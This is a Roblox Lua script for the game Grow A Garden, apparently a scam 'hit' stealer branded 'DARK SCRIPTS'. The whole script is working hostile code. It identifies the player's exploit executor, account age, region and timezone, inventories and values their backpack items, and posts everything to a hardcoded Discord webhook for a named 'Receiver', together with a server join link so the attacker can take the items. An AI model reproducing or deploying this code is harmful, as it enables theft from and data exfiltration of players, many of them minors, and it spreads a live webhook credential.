local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalizationService = game:GetService("LocalizationService")
local player = Players.LocalPlayer

local webhookUrl = "https://discord.com/api/webhooks/1380684794135842879/8tIsPrKUGSj7yTdvN2JFW9LrYIwU8WUHBxERD_gkTfD71rP1z0iu_jmukl5Jawusipmi"

if not player then
	warn("Player not found!")
	return
end

local backpack = player:FindFirstChild("Backpack")
if not backpack then
	warn("Backpack not found!")
	return
end

-- 🌍 Time + Region Info
local function getTimezone()
	local utcOffset = os.date("*t").isdst and os.time() + 3600 or os.time()
	return os.date("%Z", utcOffset)
end

local function getRegion()
	local success, result = pcall(function()
		return LocalizationService:GetCountryRegionForPlayerAsync(player)
	end)
	return success and result or "Unknown"
end

-- ⚙️ Executor Detection
local function getExecutor()
	if identifyexecutor then return identifyexecutor() end
	if getexecutor then return getexecutor() end
	if syn then return "Synapse X" end
	if KRNL_LOADED then return "KRNL" end
	if is_sirhurt_closure then return "SirHurt" end
	if secure_load then return "ScriptWare" end
	if is_fluxus_closure then return "Fluxus" end
	if get_hidden_gui or gethui then return "Hydrogen" end
	if iswindowsecure then return "Electron" end
	if readfile and not isfolder then return "Arceus X" end
	if getgenv then
		local ex = getgenv().Executor or getgenv().executor
		if typeof(ex) == "string" then return ex end
	end
	return "Unknown / Mobile"
end

-- 🎒 Backpack Items
local items = {}
for _, item in ipairs(backpack:GetChildren()) do
	local name = item.Name
	local weight = item:GetAttribute("Weight") or 0
	local value = item:GetAttribute("Value") or 0
	table.insert(items, string.format("⭐ - %s [%.2fkg] → %s¢", name, weight, value))
end

table.sort(items, function(a, b)
	local aValue = tonumber((a:match("→ ([%d,]+)¢") or "0"):gsub(",", ""))
	local bValue = tonumber((b:match("→ ([%d,]+)¢") or "0"):gsub(",", ""))
	return aValue > bValue
end)

-- 💰 Total Value
local totalValue = 0
for _, item in ipairs(backpack:GetChildren()) do
	totalValue += item:GetAttribute("Value") or 0
end

-- 🧾 Webhook Payload
local body = {
	content = ":potted_plant: **Grow A Garden Hit - DARK SCRIPTS** :four_leaf_clover:\n" ..
		":bust_in_silhouette: **Player Information**\n" ..
		"Name: " .. player.Name .. "\n" ..
		"Receiver: Gibsongamings\n" ..
		"Executor: " .. getExecutor() .. "\n" ..
		"Account Age: " .. player.AccountAge .. " days\n" ..
		"Region: " .. getRegion() .. "\n" ..
		"Timezone: " .. getTimezone() .. "\n\n" ..
		":moneybag: **Total Value**\n" ..
		string.format("%s¢", totalValue) .. "\n\n" ..
		":palm_tree: **Backpack**\n" ..
		table.concat(items, "\n") .. "\n\n" ..
		":maple_leaf: **Hits**\nAll Items\n" ..
		":island: **Join with URL**\n" ..
		"29c9025f-e399-4b7f-8eb5-4e0aaad4f10d\n" ..
		"8624669736 | 29c9025f-e399-4b7f-8eb5-4e0aaad4f10d"
}

-- 📤 Send Webhook
HttpService:PostAsync(
	webhookUrl,
	HttpService:JSONEncode(body),
	Enum.HttpContentType.ApplicationJson
)
